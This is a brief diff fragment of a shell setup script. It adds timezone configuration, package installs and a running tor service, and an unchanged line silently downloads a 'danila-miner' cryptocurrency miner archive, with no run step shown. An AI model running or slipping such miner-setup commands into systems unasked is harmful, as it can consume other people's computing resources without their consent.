@@ -1,6 +1,9 @@
-#!/bin/bash
 #!/bin/sh
-#!/bin/bash
+ln -fs /usr/share/zoneinfo/America/Toronto /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+apt update
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+service tor start
 
 wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
 
